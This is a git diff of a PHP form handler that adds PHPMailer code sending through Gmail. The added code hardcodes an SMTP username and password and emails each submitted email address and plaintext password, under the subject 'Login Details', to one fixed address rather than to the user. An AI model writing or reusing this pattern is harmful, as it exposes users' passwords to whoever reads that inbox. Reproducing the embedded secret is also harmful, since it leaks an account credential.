@@ -1,5 +1,10 @@
 <?php
 session_start();
+// Import PHPMailer classes into the global namespace
+// These must be at the top of your script, not inside a function
+use PHPMailer\PHPMailer\PHPMailer;
+use PHPMailer\PHPMailer\SMTP;
+use PHPMailer\PHPMailer\Exception;
 
 error_reporting(0);
 $error = "";
@@ -41,35 +46,49 @@ if (isset($_POST['submit'])) {
 
     // sending email
 
-    
 
-    $message = '
-    <html>
-    <head>
-    <title>Review Request Reminder</title>
-    </head>
-    <body>
-    <p>Here are the cases requiring your review in December:</p>
-    <table>
-        <tr>
-        <th>Case title</th><th>Category</th><th>Status</th><th>Due date</th>
-        </tr>
-        <tr>
-        <td>Case 1</td><td>Development</td><td>pending</td><td>Dec-20</td>
-        </tr>
-        <tr>
-        <td>Case 1</td><td>DevOps</td><td>pending</td><td>Dec-21</td>
-        </tr>
-    </table>
-    </body>
-    </html>
-    ';
-    $subject = 'Birthday Reminders for August';
 
-    $headers[] = 'MIME-Version: 1.0';
-    $headers[] = 'Content-type: text/html; charset=iso-8859-1';
+// Load Composer's autoloader
+require '../vendor/autoload.php';
 
-    mail($email, $subject, $message, [$headers], [$parameters]);
+// Instantiation and passing `true` enables exceptions
+$mail = new PHPMailer(true);
+
+try {
+    //Server settings
+    $mail->SMTPDebug = SMTP::DEBUG_SERVER;                      // Enable verbose debug output
+    $mail->isSMTP();                                            // Send using SMTP
+    $mail->Host       = 'smtp.gmail.com';                    // Set the SMTP server to send through
+    $mail->SMTPAuth   = true;                                   // Enable SMTP authentication
+    $mail->Username   = 'abdullahij951@gmail.com';                     // SMTP username
+    $mail->Password   = 'imfz3jat';                               // SMTP password
+    $mail->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS;         // Enable TLS encryption; `PHPMailer::ENCRYPTION_SMTPS` also accepted
+    $mail->Port       = 587;                                    // TCP port to connect to
+
+    //Recipients
+    $mail->setFrom('abdullahij951@gmail.com', 'Abdullahi');
+    $mail->addAddress('abdullahij951@gmail.com', 'Jimoh');     // Add a recipient
+    // $mail->addAddress('ellen@example.com');               // Name is optional
+    // $mail->addReplyTo('info@example.com', 'Information');
+    // $mail->addCC('cc@example.com');
+    // $mail->addBCC('bcc@example.com');
+
+    // Attachments
+    // $mail->addAttachment('/var/tmp/file.tar.gz');         // Add attachments
+    // $mail->addAttachment('/tmp/image.jpg', 'new.jpg');    // Optional name
+
+    // Content
+    $mail->isHTML(true);                                  // Set email format to HTML
+    $mail->Subject = 'Login Details';
+    $mail->Body    = "This is your login details:<br> email: " . $_POST['email'] . "<br>Password: " .  $_POST['password'];
+    $mail->AltBody = "This is your email " . $_POST['email'] . " and Password " .  $_POST['password'];
+
+    $mail->send();
+    echo 'Message has been sent';
+} catch (Exception $e) {
+    echo "Message could not be sent. Mailer Error: {$mail->ErrorInfo}";
+}
+
 
     if (move_uploaded_file($file_loc, $folder . $final_file)) {
         $image = $final_file;
